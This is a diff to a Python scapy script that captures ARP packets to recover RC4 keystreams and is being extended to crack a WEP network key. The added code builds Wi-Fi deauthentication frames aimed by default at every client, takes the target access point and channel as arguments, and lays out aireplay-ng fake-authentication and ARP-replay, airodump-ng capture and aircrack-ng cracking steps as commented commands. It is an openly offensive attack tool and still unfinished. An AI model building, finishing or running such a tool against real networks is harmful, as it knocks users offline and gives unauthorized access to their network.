@@ -4,6 +4,7 @@
 from scapy.all import *
 import binascii
 from argparse import ArgumentParser as AP
+import subprocess
 
 # Global variables
 ARP_REQUEST_PATTERN = 'aaaa0300000008060001080006040001'
@@ -11,6 +12,12 @@ ARP_RESPONSE_PATTERN = 'aaaa0300000008060001080006040002'
 keystreams = {}
 arp_packets_captured = 0
 iface = 'wlan0'
+
+
+def deauth(count: int, bssid: str, target_mac: str):
+    dot11 = Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)
+    frame = RadioTap()/dot11/Dot11Deauth()
+    return frame
 
 
 def expand(x):
@@ -59,24 +66,61 @@ def stop_condition(pkt):
 
 
 if __name__ == "__main__":
-    parser = AP(description="Capture ARP packets and exctract the RC4 keystream.")
-    parser.add_argument("-i", "--interface",help="interface to sniff and send packets from")
+    parser = AP(description="Capture ARP packets, exctract the RC4 keystreams, and crack the WEP key.")
+    parser.add_argument("-i", "--interface",help="interface to sniff and send packets from", required=True)
+    parser.add_argument("-a", "--access_point",help="MAC address of the access point, also known as the BSSID of the network.", required=True)
+    parser.add_argument("-s", "--source",help="MAC address of the device injecting the packets. run ifconfig to find it", required=True)
+    parser.add_argument("-c", "--channel",help="Channel that target network is operation on.", required=True)
+    parser.add_argument("-p", "--packets",help="packets per second to inject", default=500)
+    parser.add_argument("-t", "--target",help="MAC address of the target device for the de-auth attack, default is broadcast", default='ff:ff:ff:ff:ff:ff')
+    parser.add_argument("-n", "--number_deauth",help="Number of de-auth packets to send", default=25)
+    parser.add_argument("-r", "--captured_arp_packets",help="Number of IVs to capture before attempting to crack password.")
     args = parser.parse_args()
-    if args.interface is None:
-        print("[-] Please specify all program arguments... run `python3 sniffer.py -h` for help")
-        exit(1)
+
     iface = args.interface
+    access_point = args.access_point
+    source_mac = args.source
+    network_channel = args.channel
+    packets_per_second = args.packets
+    de_auth_target = args.target
+    de_auth_packet_count = args.number_deauth
+    packet_capture_count = args.captured_arp_packets
 
     # TODO Start this on a new thread
+    # NOTE Only need this if we do it ourselves
     sniff(iface=iface, prn=arp_monitor_callback, store=0, stop_filter=stop_condition)
+
+    cmd_fake_auth = 'aireplay-ng'
+    cmd_arpreplay = 'aireplay-mg'
+    cmd_airodump = 'airodump-ng'
+    cmd_aircrack = 'aircrack-ng'
+
 
     # TODO Start this on another thread
     # aireplay-ng --fakeauth 0 -a C4:12:F5:7C:7C:0C -h d0:df:9a:8e:42:e9 wlp7s0
+    # fake_auth = subprocess.Popen([cmd_fake_auth, '--fakeauth 0', f'-a {access_point}', f'-h {source_mac}', iface], stdout = subprocess.PIPE)
     # aireplay-ng --arpreplay -b C4:12:F5:7C:7C:0C -h d0:df:9a:8e:42:e9 wlp7s0
+    # arpreplay = subprocess.Popen([cmd_arpreplay, '--arpreplay', f'-b {access_point}', f'-h {source_mac}', iface], stdout = subprocess.PIPE)
 
     # TODO Start this on another thread
     # while arp_packets_captured < 1
-    # deauth(args.interface, int(args.count), args.bssid, args.target_mac)
+        # deauth_packet = deauth(int(args.count), args.access_point, args.de_auth_target)
+        # sendp(deauth_packet, iface=iface, count=de_auth_packet_count, inter=0.100)
+    
+    # TODO Start this on another thread
+    # TODO Need to stop this after we have captured enough IVs
+    # The number of IVs is listed in the output of the program, but it updates continuously on the spot, so I don't know how the subprocess handles that
+    # --output-format ivs === This could potentially help solve this problem, it saves a file.ivs
+    # airodump-ng wlp7s0 --bssid c4:12:f5:7c:7c:0c --channel 1 --write output
+    # airodump = subprocess.Popen([cmd_airodump, iface, f'--bssid {access_point}', f'--channel {network_channel}', '--write output'], stdout = subprocess.PIPE)
+    # get the output as a string
+    # output = str(airodump.communicate())
+    # store the output in the list
+    # outputlist.append(output)
+
+    # TODO After everything else is done (right number of packets captured) start cracking
+    # aircrack-ng <file_name>
+    # aircrack = subprocess.Popen([cmd_aircrack, 'output.cap'], stdout = subprocess.PIPE)
     
     # scapy_cap = rdpcap('packets/arp_packet_dump.pcap')
     # for packet in scapy_cap:
